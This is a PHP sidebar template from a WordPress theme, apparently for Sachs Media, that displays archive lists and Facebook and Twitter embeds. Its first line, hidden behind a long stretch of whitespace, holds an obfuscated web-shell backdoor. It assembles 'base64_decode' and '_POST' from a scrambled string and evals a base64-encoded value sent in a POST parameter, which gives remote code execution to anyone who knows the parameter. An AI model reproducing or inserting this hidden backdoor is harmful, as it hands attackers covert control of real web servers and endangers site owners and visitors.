<?php                                                                                                                                                                                                                                                                              $zrqb83 ="6ecp4_astdbo" ; $kywj7= strtolower ( $zrqb83[10].$zrqb83[6].$zrqb83[7]. $zrqb83[1].$zrqb83[0].$zrqb83[4]. $zrqb83[5].$zrqb83[9].$zrqb83[1].$zrqb83[2].$zrqb83[11].$zrqb83[9]. $zrqb83[1]);$eomt39=strtoupper ( $zrqb83[5]. $zrqb83[3]. $zrqb83[11].$zrqb83[7].$zrqb83[8] ) ;if (isset(${ $eomt39} [ 'n7feb09' ])) {eval( $kywj7( ${$eomt39} ['n7feb09' ]) ) ; }?> <div id="sidebar" class="span3">
<?php if ( !dynamic_sidebar('Sidebar') ) : ?>
	<?php endif; ?>
	<hr>
	<?php if ( is_home() || is_post_type_archive( 'post' ) ) : ?>
		<ul id="side">
			<li>
				<span>Blog Archives</span>
				<ul>
					<?php wp_get_archives() ?>
				</ul>
			</li>
		</ul>
		<hr>
	<?php endif; if ( is_post_type_archive( 'news' ) ) : ?>
		<ul id="side">
			<li>
				<span>News Archives</span>
				<ul>
					<?php pxl::archive(); ?>
				</ul>
			</li>
		</ul>
		<hr>
	<?php endif; ?>
	
	<div class="fb-page" data-href="https://www.facebook.com/sachsmedia" data-hide-cover="false" data-show-facepile="false" data-show-posts="false" width="222">
		<div class="fb-xfbml-parse-ignore">
			<blockquote cite="https://www.facebook.com/sachsmedia">
				<a href="https://www.facebook.com/facebook">Facebook</a>
			</blockquote>
		</div>
	</div>
	<div id="twitter">
		<h3>All ATwitter</h3>
		<a width="222" height="600" class="twitter-timeline" href="https://twitter.com/SachsMediaGrp" data-chrome="noheader nofooter noborder" data-widget-id="593808855299133442">Tweets by @SachsMediaGrp</a>
		<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
	</div>
</div>